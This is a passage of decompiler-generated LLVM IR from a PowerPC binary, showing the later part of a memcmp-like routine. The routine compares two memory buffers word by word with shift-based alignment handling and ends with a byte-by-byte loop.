dec_label_pc_1001343c:                            ; preds = %dec_label_pc_10013414
  %v1_10013440 = add i32 %v0_10013468, -4
  %v1_10013444 = add i32 %v0_1001346c, -4
  %v1_10013448 = add nuw nsw i32 %v1_100133f4, 1
  br label %dec_label_pc_10013498

dec_label_pc_10013450:                            ; preds = %dec_label_pc_1001340c
  %v1_10013450 = inttoptr i32 %v0_10013468 to i32*
  %v2_10013450 = load i32, i32* %v1_10013450, align 4
  store i32 %v2_10013450, i32* %r9.global-to-local, align 4
  %v1_10013454 = inttoptr i32 %v0_1001346c to i32*
  %v2_10013454 = load i32, i32* %v1_10013454, align 4
  store i32 %v2_10013454, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013480

dec_label_pc_1001345c:                            ; preds = %dec_label_pc_100133fc
  %v1_1001345c = inttoptr i32 %v0_10013468 to i32*
  %v2_1001345c = load i32, i32* %v1_1001345c, align 4
  %v1_10013460 = add nsw i32 %v1_100133f4, -1
  %v1_10013464 = inttoptr i32 %v0_1001346c to i32*
  %v2_10013464 = load i32, i32* %v1_10013464, align 4
  %v1_10013468 = add i32 %v0_10013468, 4
  %v1_1001346c = add i32 %v0_1001346c, 4
  br label %dec_label_pc_10013470

dec_label_pc_10013470:                            ; preds = %dec_label_pc_100134c8, %dec_label_pc_1001345c
  %v0_100134c060 = phi i32 [ %v1_100134c0, %dec_label_pc_100134c8 ], [ %v1_10013460, %dec_label_pc_1001345c ]
  %v0_10013474 = phi i32 [ %v1_100134c8, %dec_label_pc_100134c8 ], [ %v1_10013468, %dec_label_pc_1001345c ]
  %v1_10013470 = phi i32 [ %v3_100134b0, %dec_label_pc_100134c8 ], [ %v2_10013464, %dec_label_pc_1001345c ]
  %v0_10013470 = phi i32 [ %v3_100134ac, %dec_label_pc_100134c8 ], [ %v2_1001345c, %dec_label_pc_1001345c ]
  %storemerge1 = phi i32 [ %v1_100134cc, %dec_label_pc_100134c8 ], [ %v1_1001346c, %dec_label_pc_1001345c ]
  %v4_10013470 = icmp eq i32 %v0_10013470, %v1_10013470
  store i1 %v4_10013470, i1* %cr7_eq.global-to-local, align 1
  %v1_10013474 = inttoptr i32 %v0_10013474 to i32*
  %v2_10013474 = load i32, i32* %v1_10013474, align 4
  store i32 %v2_10013474, i32* %r9.global-to-local, align 4
  %v1_10013478 = inttoptr i32 %storemerge1 to i32*
  %v2_10013478 = load i32, i32* %v1_10013478, align 4
  store i32 %v2_10013478, i32* %r0.global-to-local, align 4
  br i1 %v4_10013470, label %dec_label_pc_10013480, label %dec_label_pc_100134e4

dec_label_pc_10013480:                            ; preds = %dec_label_pc_10013470, %dec_label_pc_10013450
  %v0_100134c059 = phi i32 [ %v0_100134c060, %dec_label_pc_10013470 ], [ %v1_100133f4, %dec_label_pc_10013450 ]
  %v0_10013488 = phi i32 [ %storemerge1, %dec_label_pc_10013470 ], [ %v0_1001346c, %dec_label_pc_10013450 ]
  %v0_10013484 = phi i32 [ %v0_10013474, %dec_label_pc_10013470 ], [ %v0_10013468, %dec_label_pc_10013450 ]
  %v1_10013490 = phi i32 [ %v2_10013478, %dec_label_pc_10013470 ], [ %v2_10013454, %dec_label_pc_10013450 ]
  %v0_10013490 = phi i32 [ %v2_10013474, %dec_label_pc_10013470 ], [ %v2_10013450, %dec_label_pc_10013450 ]
  %v4_10013480 = icmp eq i32 %v0_10013490, %v1_10013490
  store i1 %v4_10013480, i1* %cr7_eq.global-to-local, align 1
  %v1_10013484 = add i32 %v0_10013484, 4
  %v2_10013484 = inttoptr i32 %v1_10013484 to i32*
  %v3_10013484 = load i32, i32* %v2_10013484, align 4
  %v1_10013488 = add i32 %v0_10013488, 4
  %v2_10013488 = inttoptr i32 %v1_10013488 to i32*
  %v3_10013488 = load i32, i32* %v2_10013488, align 4
  br i1 %v4_10013480, label %dec_label_pc_10013498, label %dec_label_pc_10013490

dec_label_pc_10013490:                            ; preds = %dec_label_pc_10013480
  %v3_10013490 = icmp ugt i32 %v0_10013490, %v1_10013490
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013490, label %dec_label_pc_100134f0, label %dec_label_pc_100134e8

dec_label_pc_10013498:                            ; preds = %dec_label_pc_10013480, %dec_label_pc_1001343c
  %v0_100134c058 = phi i32 [ %v0_100134c059, %dec_label_pc_10013480 ], [ %v1_10013448, %dec_label_pc_1001343c ]
  %v0_100134a0 = phi i32 [ %v0_10013488, %dec_label_pc_10013480 ], [ %v1_10013444, %dec_label_pc_1001343c ]
  %v0_1001349c = phi i32 [ %v0_10013484, %dec_label_pc_10013480 ], [ %v1_10013440, %dec_label_pc_1001343c ]
  %v1_10013498 = phi i32 [ %v3_10013488, %dec_label_pc_10013480 ], [ %v2_10013418, %dec_label_pc_1001343c ]
  %v0_10013498 = phi i32 [ %v3_10013484, %dec_label_pc_10013480 ], [ %v2_1001341c, %dec_label_pc_1001343c ]
  %v4_10013498 = icmp eq i32 %v0_10013498, %v1_10013498
  store i1 %v4_10013498, i1* %cr7_eq.global-to-local, align 1
  %v1_1001349c = add i32 %v0_1001349c, 8
  %v2_1001349c = inttoptr i32 %v1_1001349c to i32*
  %v3_1001349c = load i32, i32* %v2_1001349c, align 4
  %v1_100134a0 = add i32 %v0_100134a0, 8
  %v2_100134a0 = inttoptr i32 %v1_100134a0 to i32*
  %v3_100134a0 = load i32, i32* %v2_100134a0, align 4
  store i32 %v3_100134a0, i32* %r0.global-to-local, align 4
  br i1 %v4_10013498, label %dec_label_pc_100134a8, label %dec_label_pc_100134e4

dec_label_pc_100134a8:                            ; preds = %dec_label_pc_10013498, %dec_label_pc_10013424
  %v0_100134c0 = phi i32 [ %v0_100134c058, %dec_label_pc_10013498 ], [ %v1_10013434, %dec_label_pc_10013424 ]
  %v0_100134cc = phi i32 [ %v0_100134a0, %dec_label_pc_10013498 ], [ %v1_10013430, %dec_label_pc_10013424 ]
  %v0_100134c8 = phi i32 [ %v0_1001349c, %dec_label_pc_10013498 ], [ %v1_10013428, %dec_label_pc_10013424 ]
  %v1_100134b8 = phi i32 [ %v3_100134a0, %dec_label_pc_10013498 ], [ %v2_10013418, %dec_label_pc_10013424 ]
  %v0_100134b8 = phi i32 [ %v3_1001349c, %dec_label_pc_10013498 ], [ %v2_1001341c, %dec_label_pc_10013424 ]
  %v4_100134a8 = icmp eq i32 %v0_100134b8, %v1_100134b8
  store i1 %v4_100134a8, i1* %cr7_eq.global-to-local, align 1
  %v1_100134ac = add i32 %v0_100134c8, 12
  %v2_100134ac = inttoptr i32 %v1_100134ac to i32*
  %v3_100134ac = load i32, i32* %v2_100134ac, align 4
  %v1_100134b0 = add i32 %v0_100134cc, 12
  %v2_100134b0 = inttoptr i32 %v1_100134b0 to i32*
  %v3_100134b0 = load i32, i32* %v2_100134b0, align 4
  br i1 %v4_100134a8, label %dec_label_pc_100134c0, label %dec_label_pc_100134b8

dec_label_pc_100134b8:                            ; preds = %dec_label_pc_100134a8
  %v3_100134b8 = icmp ugt i32 %v0_100134b8, %v1_100134b8
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100134b8, label %dec_label_pc_100134f0, label %dec_label_pc_100134e8

dec_label_pc_100134c0:                            ; preds = %dec_label_pc_100134a8
  %v1_100134c0 = add i32 %v0_100134c0, -4
  %v4_100134c0 = icmp eq i32 %v1_100134c0, 0
  br i1 %v4_100134c0, label %dec_label_pc_100134d4, label %dec_label_pc_100134c8

dec_label_pc_100134c8:                            ; preds = %dec_label_pc_100134c0
  %v1_100134c8 = add i32 %v0_100134c8, 16
  %v1_100134cc = add i32 %v0_100134cc, 16
  br label %dec_label_pc_10013470

dec_label_pc_100134d4:                            ; preds = %dec_label_pc_100134c0
  %v4_100134d4 = icmp eq i32 %v3_100134ac, %v3_100134b0
  store i1 %v4_100134d4, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v4_100134d4, label %dec_label_pc_10013648, label %dec_label_pc_100134e4

dec_label_pc_100134e4:                            ; preds = %dec_label_pc_100134d4, %dec_label_pc_10013470, %dec_label_pc_10013498
  %v1_100134e0 = phi i32 [ %v3_100134b0, %dec_label_pc_100134d4 ], [ %v1_10013470, %dec_label_pc_10013470 ], [ %v1_10013498, %dec_label_pc_10013498 ]
  %v0_100134e0 = phi i32 [ %v3_100134ac, %dec_label_pc_100134d4 ], [ %v0_10013470, %dec_label_pc_10013470 ], [ %v0_10013498, %dec_label_pc_10013498 ]
  %v3_100134e0 = icmp ugt i32 %v0_100134e0, %v1_100134e0
  %v4_100134e0 = icmp eq i32 %v0_100134e0, %v1_100134e0
  store i1 %v4_100134e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100134e0, label %dec_label_pc_100134f0, label %dec_label_pc_100134e8

dec_label_pc_100134e8:                            ; preds = %dec_label_pc_10013490, %dec_label_pc_100134b8, %dec_label_pc_100134e4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013648

dec_label_pc_100134f0:                            ; preds = %dec_label_pc_10013490, %dec_label_pc_100134b8, %dec_label_pc_100134e4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013648

dec_label_pc_100134fc:                            ; preds = %dec_label_pc_100133ec
  %v1_10013500 = mul nuw nsw i32 %v1_100133ec, 8
  %v3_10013504 = icmp eq i32 %v1_100133fc, 1
  store i1 %v3_10013504, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_100133f4, i32* %r6.global-to-local, align 4
  %v1_1001350c = call i32 @__asm_rlwinm(i32 %v0_10013468, i32 0, i32 0, i32 29)
  %v1_10013510 = sub nsw i32 32, %v1_10013500
  %v0_10013514 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10013514, label %dec_label_pc_10013574, label %dec_label_pc_10013518

dec_label_pc_10013518:                            ; preds = %dec_label_pc_100134fc
  %v0_10013518 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013518 = icmp eq i32 %v0_10013518, 0
  %v3_10013518 = icmp eq i32 %v0_10013518, 1
  store i1 %v3_10013518, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10013518, label %dec_label_pc_10013564, label %dec_label_pc_10013520

dec_label_pc_10013520:                            ; preds = %dec_label_pc_10013518
  %v3_10013520 = icmp eq i32 %v0_10013518, 3
  store i1 %v3_10013520, i1* %cr7_eq.global-to-local, align 1
  %v0_10013524 = load i32, i32* @r4, align 4
  %v1_10013524 = inttoptr i32 %v0_10013524 to i32*
  %v2_10013524 = load i32, i32* %v1_10013524, align 4
  %v1_10013528 = inttoptr i32 %v1_1001350c to i32*
  %v2_10013528 = load i32, i32* %v1_10013528, align 4
  store i32 %v2_10013528, i32* %r0.global-to-local, align 4
  %v1_1001352c = add i32 %v1_1001350c, 4
  %v2_1001352c = inttoptr i32 %v1_1001352c to i32*
  %v3_1001352c = load i32, i32* %v2_1001352c, align 4
  store i32 %v3_1001352c, i32* %r9.global-to-local, align 4
  br i1 %v3_10013520, label %dec_label_pc_1001354c, label %dec_label_pc_10013534

dec_label_pc_10013534:                            ; preds = %dec_label_pc_10013520
  %v1_1001353c = add i32 %v1_1001350c, -4
  %v1_10013540 = add i32 %v0_10013524, -8
  %v0_10013544 = load i32, i32* %r6.global-to-local, align 4
  %v1_10013544 = add i32 %v0_10013544, 2
  store i32 %v1_10013544, i32* %r6.global-to-local, align 4
  %.pre79 = urem i32 %v1_10013500, 64
  %.pre80 = urem i32 %v1_10013510, 64
  br label %dec_label_pc_100135e0

dec_label_pc_1001354c:                            ; preds = %dec_label_pc_10013520
  %v1_10013558 = add i32 %v0_10013524, -4
  %v0_1001355c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001355c = add i32 %v0_1001355c, 1
  store i32 %v1_1001355c, i32* %r6.global-to-local, align 4
  %.pre77 = urem i32 %v1_10013500, 64
  %.pre78 = urem i32 %v1_10013510, 64
  br label %dec_label_pc_100135c4

dec_label_pc_10013564:                            ; preds = %dec_label_pc_10013518
  %v1_10013564 = inttoptr i32 %v1_1001350c to i32*
  %v2_10013564 = load i32, i32* %v1_10013564, align 4
  %v0_10013568 = load i32, i32* @r4, align 4
  %v1_1001356c = add i32 %v1_1001350c, 4
  %v2_1001356c = inttoptr i32 %v1_1001356c to i32*
  %v3_1001356c = load i32, i32* %v2_1001356c, align 4
  %.pre75 = urem i32 %v1_10013500, 64
  %.pre76 = urem i32 %v1_10013510, 64
  br label %dec_label_pc_100135a8

dec_label_pc_10013574:                            ; preds = %dec_label_pc_100134fc
  %v1_10013574 = inttoptr i32 %v1_1001350c to i32*
  %v2_10013574 = load i32, i32* %v1_10013574, align 4
  %v0_10013578 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013578 = add i32 %v0_10013578, -1
  store i32 %v1_10013578, i32* %r6.global-to-local, align 4
  %v1_1001357c = add i32 %v1_1001350c, 4
  %v2_1001357c = inttoptr i32 %v1_1001357c to i32*
  %v3_1001357c = load i32, i32* %v2_1001357c, align 4
  %v1_10013580 = add i32 %v1_1001350c, 8
  %v0_10013584 = load i32, i32* @r4, align 4
  %v1_10013584 = inttoptr i32 %v0_10013584 to i32*
  %v2_10013584 = load i32, i32* %v1_10013584, align 4
  %v1_10013588 = add i32 %v0_10013584, 4
  %.pre = urem i32 %v1_10013500, 64
  %.pre74 = urem i32 %v1_10013510, 64
  br label %dec_label_pc_1001358c

dec_label_pc_1001358c:                            ; preds = %dec_label_pc_1001360c, %dec_label_pc_10013574
  %v2_10013590.pre-phi = phi i32 [ %v2_100135e4.pre-phi, %dec_label_pc_1001360c ], [ %.pre74, %dec_label_pc_10013574 ]
  %v2_1001358c.pre-phi = phi i32 [ %v2_100135e0.pre-phi, %dec_label_pc_1001360c ], [ %.pre, %dec_label_pc_10013574 ]
  %v1_1001359c = phi i32 [ %v3_100135f4, %dec_label_pc_1001360c ], [ %v2_10013584, %dec_label_pc_10013574 ]
  %v0_10013598 = phi i32 [ %v1_1001360c, %dec_label_pc_1001360c ], [ %v1_10013580, %dec_label_pc_10013574 ]
  %v0_10013590 = phi i32 [ %v3_100135ec, %dec_label_pc_1001360c ], [ %v3_1001357c, %dec_label_pc_10013574 ]
  %v0_1001358c = phi i32 [ %v0_10013618, %dec_label_pc_1001360c ], [ %v2_10013574, %dec_label_pc_10013574 ]
  %storemerge2 = phi i32 [ %v1_10013610, %dec_label_pc_1001360c ], [ %v1_10013588, %dec_label_pc_10013574 ]
  %v3_1001358c = shl i32 %v0_1001358c, %v2_1001358c.pre-phi
  %v3_10013590 = lshr i32 %v0_10013590, %v2_10013590.pre-phi
  store i32 %v3_10013590, i32* %r9.global-to-local, align 4
  %v2_10013594 = or i32 %v3_1001358c, %v3_10013590
  store i32 %v2_10013594, i32* %r0.global-to-local, align 4
  %v1_10013598 = inttoptr i32 %v0_10013598 to i32*
  %v2_10013598 = load i32, i32* %v1_10013598, align 4
  %v4_1001359c = icmp eq i32 %v2_10013594, %v1_1001359c
  store i1 %v4_1001359c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001359c, label %dec_label_pc_100135a8, label %dec_label_pc_10013630

dec_label_pc_100135a8:                            ; preds = %dec_label_pc_1001358c, %dec_label_pc_10013564
  %v2_100135ac.pre-phi = phi i32 [ %v2_10013590.pre-phi, %dec_label_pc_1001358c ], [ %.pre76, %dec_label_pc_10013564 ]
  %v2_100135a8.pre-phi = phi i32 [ %v2_1001358c.pre-phi, %dec_label_pc_1001358c ], [ %.pre75, %dec_label_pc_10013564 ]
  %v0_100135bc = phi i32 [ %storemerge2, %dec_label_pc_1001358c ], [ %v0_10013568, %dec_label_pc_10013564 ]
  %v1_100135b8.in.in = phi i32 [ %storemerge2, %dec_label_pc_1001358c ], [ %v0_10013568, %dec_label_pc_10013564 ]
  %v0_100135b4 = phi i32 [ %v0_10013598, %dec_label_pc_1001358c ], [ %v1_1001356c, %dec_label_pc_10013564 ]
  %v0_100135ac = phi i32 [ %v2_10013598, %dec_label_pc_1001358c ], [ %v3_1001356c, %dec_label_pc_10013564 ]
  %v0_100135a8 = phi i32 [ %v0_10013590, %dec_label_pc_1001358c ], [ %v2_10013564, %dec_label_pc_10013564 ]
  %v1_100135b8.in = inttoptr i32 %v1_100135b8.in.in to i32*
  %v1_100135b8 = load i32, i32* %v1_100135b8.in, align 4
  %v3_100135a8 = shl i32 %v0_100135a8, %v2_100135a8.pre-phi
  %v3_100135ac = lshr i32 %v0_100135ac, %v2_100135ac.pre-phi
  store i32 %v3_100135ac, i32* %r9.global-to-local, align 4
  %v2_100135b0 = or i32 %v3_100135a8, %v3_100135ac
  store i32 %v2_100135b0, i32* %r0.global-to-local, align 4
  %v1_100135b4 = add i32 %v0_100135b4, 4
  %v2_100135b4 = inttoptr i32 %v1_100135b4 to i32*
  %v3_100135b4 = load i32, i32* %v2_100135b4, align 4
  %v4_100135b8 = icmp eq i32 %v2_100135b0, %v1_100135b8
  store i1 %v4_100135b8, i1* %cr7_eq.global-to-local, align 1
  %v1_100135bc = add i32 %v0_100135bc, 4
  %v2_100135bc = inttoptr i32 %v1_100135bc to i32*
  %v3_100135bc = load i32, i32* %v2_100135bc, align 4
  br i1 %v4_100135b8, label %dec_label_pc_100135c4, label %dec_label_pc_10013634

dec_label_pc_100135c4:                            ; preds = %dec_label_pc_100135a8, %dec_label_pc_1001354c
  %v2_100135c8.pre-phi = phi i32 [ %v2_100135ac.pre-phi, %dec_label_pc_100135a8 ], [ %.pre78, %dec_label_pc_1001354c ]
  %v2_100135c4.pre-phi = phi i32 [ %v2_100135a8.pre-phi, %dec_label_pc_100135a8 ], [ %.pre77, %dec_label_pc_1001354c ]
  %v0_100135d8 = phi i32 [ %v0_100135bc, %dec_label_pc_100135a8 ], [ %v1_10013558, %dec_label_pc_1001354c ]
  %v1_100135d4 = phi i32 [ %v3_100135bc, %dec_label_pc_100135a8 ], [ %v2_10013524, %dec_label_pc_1001354c ]
  %v0_100135d0 = phi i32 [ %v0_100135b4, %dec_label_pc_100135a8 ], [ %v1_1001350c, %dec_label_pc_1001354c ]
  %v0_100135c8 = phi i32 [ %v3_100135b4, %dec_label_pc_100135a8 ], [ %v3_1001352c, %dec_label_pc_1001354c ]
  %v0_100135c4 = phi i32 [ %v0_100135ac, %dec_label_pc_100135a8 ], [ %v2_10013528, %dec_label_pc_1001354c ]
  %v3_100135c4 = shl i32 %v0_100135c4, %v2_100135c4.pre-phi
  %v3_100135c8 = lshr i32 %v0_100135c8, %v2_100135c8.pre-phi
  store i32 %v3_100135c8, i32* %r9.global-to-local, align 4
  %v2_100135cc = or i32 %v3_100135c4, %v3_100135c8
  store i32 %v2_100135cc, i32* %r0.global-to-local, align 4
  %v1_100135d0 = add i32 %v0_100135d0, 8
  %v2_100135d0 = inttoptr i32 %v1_100135d0 to i32*
  %v3_100135d0 = load i32, i32* %v2_100135d0, align 4
  %v4_100135d4 = icmp eq i32 %v2_100135cc, %v1_100135d4
  store i1 %v4_100135d4, i1* %cr7_eq.global-to-local, align 1
  %v1_100135d8 = add i32 %v0_100135d8, 8
  %v2_100135d8 = inttoptr i32 %v1_100135d8 to i32*
  %v3_100135d8 = load i32, i32* %v2_100135d8, align 4
  br i1 %v4_100135d4, label %dec_label_pc_100135e0, label %dec_label_pc_10013630

dec_label_pc_100135e0:                            ; preds = %dec_label_pc_100135c4, %dec_label_pc_10013534
  %v2_100135e4.pre-phi = phi i32 [ %v2_100135c8.pre-phi, %dec_label_pc_100135c4 ], [ %.pre80, %dec_label_pc_10013534 ]
  %v2_100135e0.pre-phi = phi i32 [ %v2_100135c4.pre-phi, %dec_label_pc_100135c4 ], [ %.pre79, %dec_label_pc_10013534 ]
  %v0_10013610 = phi i32 [ %v0_100135d8, %dec_label_pc_100135c4 ], [ %v1_10013540, %dec_label_pc_10013534 ]
  %v1_100135f0 = phi i32 [ %v3_100135d8, %dec_label_pc_100135c4 ], [ %v2_10013524, %dec_label_pc_10013534 ]
  %v0_1001360c = phi i32 [ %v0_100135d0, %dec_label_pc_100135c4 ], [ %v1_1001353c, %dec_label_pc_10013534 ]
  %v0_10013618 = phi i32 [ %v3_100135d0, %dec_label_pc_100135c4 ], [ %v3_1001352c, %dec_label_pc_10013534 ]
  %v0_100135e0 = phi i32 [ %v0_100135c8, %dec_label_pc_100135c4 ], [ %v2_10013528, %dec_label_pc_10013534 ]
  %v3_100135e0 = shl i32 %v0_100135e0, %v2_100135e0.pre-phi
  %v3_100135e4 = lshr i32 %v0_10013618, %v2_100135e4.pre-phi
  store i32 %v3_100135e4, i32* %r9.global-to-local, align 4
  %v2_100135e8 = or i32 %v3_100135e0, %v3_100135e4
  store i32 %v2_100135e8, i32* %r0.global-to-local, align 4
  %v1_100135ec = add i32 %v0_1001360c, 12
  %v2_100135ec = inttoptr i32 %v1_100135ec to i32*
  %v3_100135ec = load i32, i32* %v2_100135ec, align 4
  %v4_100135f0 = icmp eq i32 %v2_100135e8, %v1_100135f0
  store i1 %v4_100135f0, i1* %cr7_eq.global-to-local, align 1
  %v1_100135f4 = add i32 %v0_10013610, 12
  %v2_100135f4 = inttoptr i32 %v1_100135f4 to i32*
  %v3_100135f4 = load i32, i32* %v2_100135f4, align 4
  br i1 %v4_100135f0, label %dec_label_pc_10013604, label %dec_label_pc_10013634

dec_label_pc_10013604:                            ; preds = %dec_label_pc_100135e0
  %v0_10013604 = load i32, i32* %r6.global-to-local, align 4
  %v1_10013604 = add i32 %v0_10013604, -4
  store i32 %v1_10013604, i32* %r6.global-to-local, align 4
  %v4_10013604 = icmp eq i32 %v1_10013604, 0
  br i1 %v4_10013604, label %dec_label_pc_10013618, label %dec_label_pc_1001360c

dec_label_pc_1001360c:                            ; preds = %dec_label_pc_10013604
  %v1_1001360c = add i32 %v0_1001360c, 16
  %v1_10013610 = add i32 %v0_10013610, 16
  br label %dec_label_pc_1001358c

dec_label_pc_10013618:                            ; preds = %dec_label_pc_10013604
  %v3_10013618 = shl i32 %v0_10013618, %v2_100135e0.pre-phi
  %v3_1001361c = lshr i32 %v3_100135ec, %v2_100135e4.pre-phi
  store i32 %v3_1001361c, i32* %r9.global-to-local, align 4
  %v2_10013620 = or i32 %v3_1001361c, %v3_10013618
  store i32 %v2_10013620, i32* %r0.global-to-local, align 4
  %v4_10013628 = icmp eq i32 %v2_10013620, %v3_100135f4
  store i1 %v4_10013628, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10013628, label %dec_label_pc_10013648, label %dec_label_pc_10013630

dec_label_pc_10013630:                            ; preds = %dec_label_pc_100135c4, %dec_label_pc_1001358c, %dec_label_pc_10013618
  %v1_10013630 = phi i32 [ %v1_100135d4, %dec_label_pc_100135c4 ], [ %v1_1001359c, %dec_label_pc_1001358c ], [ %v3_100135f4, %dec_label_pc_10013618 ]
  %v0_10013630 = phi i32 [ %v2_100135cc, %dec_label_pc_100135c4 ], [ %v2_10013594, %dec_label_pc_1001358c ], [ %v2_10013620, %dec_label_pc_10013618 ]
  %v3_10013630 = icmp ugt i32 %v0_10013630, %v1_10013630
  %v4_10013630 = icmp eq i32 %v0_10013630, %v1_10013630
  store i1 %v4_10013630, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013630, label %dec_label_pc_10013640, label %dec_label_pc_10013638

dec_label_pc_10013634:                            ; preds = %dec_label_pc_100135e0, %dec_label_pc_100135a8
  %v1_100135fc = phi i32 [ %v1_100135f0, %dec_label_pc_100135e0 ], [ %v1_100135b8, %dec_label_pc_100135a8 ]
  %v0_100135fc = phi i32 [ %v2_100135e8, %dec_label_pc_100135e0 ], [ %v2_100135b0, %dec_label_pc_100135a8 ]
  %v3_100135fc = icmp ugt i32 %v0_100135fc, %v1_100135fc
  %v4_100135fc = icmp eq i32 %v0_100135fc, %v1_100135fc
  store i1 %v4_100135fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100135fc, label %dec_label_pc_10013640, label %dec_label_pc_10013638

dec_label_pc_10013638:                            ; preds = %dec_label_pc_10013630, %dec_label_pc_10013634
  br label %dec_label_pc_10013648

dec_label_pc_10013640:                            ; preds = %dec_label_pc_10013630, %dec_label_pc_10013634
  br label %dec_label_pc_10013648

dec_label_pc_10013648:                            ; preds = %dec_label_pc_10013640, %dec_label_pc_10013638, %dec_label_pc_10013618, %dec_label_pc_100134f0, %dec_label_pc_100134e8, %dec_label_pc_100134d4
  %storemerge = phi i32 [ 0, %dec_label_pc_100134d4 ], [ -1, %dec_label_pc_100134e8 ], [ 1, %dec_label_pc_100134f0 ], [ 0, %dec_label_pc_10013618 ], [ -1, %dec_label_pc_10013638 ], [ 1, %dec_label_pc_10013640 ]
  %v3_10013648 = icmp eq i32 %storemerge, 0
  store i1 %v3_10013648, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013648, label %dec_label_pc_10013664, label %dec_label_pc_100136a4

dec_label_pc_10013654:                            ; preds = %dec_label_pc_100133c4
  br label %dec_label_pc_100136a4

dec_label_pc_1001365c:                            ; preds = %dec_label_pc_10013678
  br label %dec_label_pc_100136a4

dec_label_pc_10013664:                            ; preds = %dec_label_pc_10013648
  %v0_10013664 = load i32, i32* @r31, align 4
  %v1_10013664 = call i32 @__asm_rlwinm(i32 %v0_10013664, i32 0, i32 0, i32 29)
  store i32 %v1_10013664, i32* %r0.global-to-local, align 4
  %v0_10013668 = load i32, i32* @r31, align 4
  %v1_10013668 = urem i32 %v0_10013668, 4
  %v0_1001366c = load i32, i32* %r29.global-to-local, align 4
  %v2_1001366c = add i32 %v0_1001366c, %v1_10013664
  store i32 %v2_1001366c, i32* @r4, align 4
  %v0_10013670 = load i32, i32* @r30, align 4
  %v2_10013670 = add i32 %v0_10013670, %v1_10013664
  store i32 %v2_10013670, i32* @r3, align 4
  br label %dec_label_pc_10013694

dec_label_pc_10013678:                            ; preds = %dec_label_pc_1001369c
  %v0_10013678 = load i32, i32* @r3, align 4
  %v1_10013678 = inttoptr i32 %v0_10013678 to i8*
  %v2_10013678 = load i8, i8* %v1_10013678, align 1
  %v3_10013678 = zext i8 %v2_10013678 to i32
  store i32 %v3_10013678, i32* %r0.global-to-local, align 4
  %v1_1001367c = add i32 %v0_10013678, 1
  store i32 %v1_1001367c, i32* @r3, align 4
  %v0_10013680 = load i32, i32* @r4, align 4
  %v1_10013680 = inttoptr i32 %v0_10013680 to i8*
  %v2_10013680 = load i8, i8* %v1_10013680, align 1
  %v3_10013680 = zext i8 %v2_10013680 to i32
  store i32 %v3_10013680, i32* %r9.global-to-local, align 4
  %v1_10013684 = add i32 %v0_10013680, 1
  store i32 %v1_10013684, i32* @r4, align 4
  %v2_10013688 = sub nsw i32 %v3_10013678, %v3_10013680
  store i32 %v2_10013688, i32* %r0.global-to-local, align 4
  %v4_1001368c = icmp eq i8 %v2_10013678, %v2_10013680
  br i1 %v4_1001368c, label %dec_label_pc_1001369c, label %dec_label_pc_1001365c

dec_label_pc_10013694:                            ; preds = %entry, %dec_label_pc_10013664
  %v0_10013694 = phi i32 [ %arg1, %entry ], [ %v1_10013668, %dec_label_pc_10013664 ]
  %v1_10013694 = add i32 %v0_10013694, 1
  br label %dec_label_pc_1001369c

dec_label_pc_1001369c:                            ; preds = %dec_label_pc_10013678, %dec_label_pc_10013694
  %v0_1001369c = phi i32 [ %v1_1001369c, %dec_label_pc_10013678 ], [ %v1_10013694, %dec_label_pc_10013694 ]
  %v1_1001369c = add i32 %v0_1001369c, -1
  %v2_1001369c = icmp eq i32 %v1_1001369c, 0
  br i1 %v2_1001369c, label %dec_label_pc_100136a0, label %dec_label_pc_10013678

dec_label_pc_100136a0:                            ; preds = %dec_label_pc_1001369c
  br label %dec_label_pc_100136a4

dec_label_pc_100136a4:                            ; preds = %dec_label_pc_10013648, %dec_label_pc_1001365c, %dec_label_pc_10013654, %dec_label_pc_100136a0
  %v0_100136ac = phi i32 [ %storemerge, %dec_label_pc_10013648 ], [ %v2_10013688, %dec_label_pc_1001365c ], [ %v2_100133d8, %dec_label_pc_10013654 ], [ 0, %dec_label_pc_100136a0 ]
  ret i32 %v0_100136ac

; uselistorder directives
  uselistorder i32 %v1_1001369c, { 1, 0 }
  uselistorder i32 %v0_100135fc, { 1, 0 }
  uselistorder i32 %v1_100135fc, { 1, 0 }
  uselistorder i32 %v0_10013630, { 1, 0 }
  uselistorder i32 %v1_10013630, { 1, 0 }
  uselistorder i32 %v2_100135e0.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v2_100135e4.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v1_100135b8, { 1, 0 }
  uselistorder i32 %v0_10013518, { 0, 2, 1 }
  uselistorder i32 %v1_1001350c, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v1_10013500, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_100134e0, { 1, 0 }
  uselistorder i32 %v1_100134e0, { 1, 0 }
  uselistorder i32 %v1_100134c0, { 1, 0 }
  uselistorder i32 %v1_100133fc, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_100133f4, { 1, 5, 4, 3, 2, 6, 0 }
  uselistorder i32 %v1_100133e0, { 1, 0 }
  uselistorder i32 %v0_1001346c, { 1, 2, 3, 4, 5, 6, 7, 10, 0, 9, 8 }
  uselistorder i32 %v0_10013468, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0, 11, 10 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 12 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 2, 5, 3, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 17, 9, 10, 11, 12, 13, 14, 15, 16, 18, 20, 19 }
